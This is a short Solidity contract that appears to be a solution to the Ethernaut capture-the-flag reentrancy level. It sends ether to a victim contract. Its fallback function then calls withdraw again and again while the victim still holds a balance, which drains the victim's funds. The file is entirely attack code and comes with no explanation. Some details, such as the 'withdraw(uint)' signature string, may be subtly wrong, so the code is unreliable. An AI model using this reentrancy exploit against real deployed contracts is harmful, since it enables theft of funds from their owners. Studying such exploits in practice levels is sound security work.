// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

contract EthernautReentrancyAttack {
  address payable victim;
  // from js console
  // await getBalance(instance)

  uint public amount;

  constructor(address payable _victim) public payable {
    victim = _victim;
  }

  function donate() public payable {
    bytes memory payload = abi.encodeWithSignature("donate(address)", address(this));
    amount = msg.value;
    victim.call{value: amount, gas: 4000000}(payload);
  }

  fallback() external payable {
    if (victim.balance != 0) {
      bytes memory payload = abi.encodeWithSignature("withdraw(uint)", amount);
      victim.call(payload);
    }
  }

}